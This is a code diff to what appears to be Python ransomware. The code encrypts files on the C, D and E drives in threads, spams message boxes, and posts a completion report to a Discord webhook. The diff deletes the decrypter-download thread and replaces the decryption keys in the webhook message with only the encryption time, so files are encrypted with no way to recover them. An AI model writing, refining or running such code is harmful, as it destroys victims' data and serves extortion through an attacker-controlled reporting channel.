@@ -749,7 +749,6 @@ ff = Thread(target = C_drive_videos)
 g = Thread(target = D_drive)
 h = Thread(target = E_drive)
 
-download = Thread(target = download_decrypter)
 message = Thread(target = spam_messagebox)
 
 start = time.time()
@@ -786,14 +785,12 @@ embed = {
                 'icon_url': 'https://cdn.discordapp.com/attachments/947224575622676520/953286335198806086/Pfp.gif'
             },
             'color': 16119101,
-            'description': f'Finished encrypted everything - Time to encrypt everything {(encrpyt_time)}',
+            'description': f'.',
             'fields': [
                 {
                     'name': '\u200b',
                     'value': f'''```
-Keys to decrypt: 
-                        
-{json.dumps(PASSWORDS, indent=6)}
+Finished encrypted everything - Time to encrypt everything {(encrpyt_time)}seconds
                         ```
                     ''',
                     'inline': True
@@ -806,8 +803,5 @@ Keys to decrypt:
     ]
 }
 httpx.post(webhook, json=embed)
-download.start()
 message.start()
-
-download.join()
 message.join()
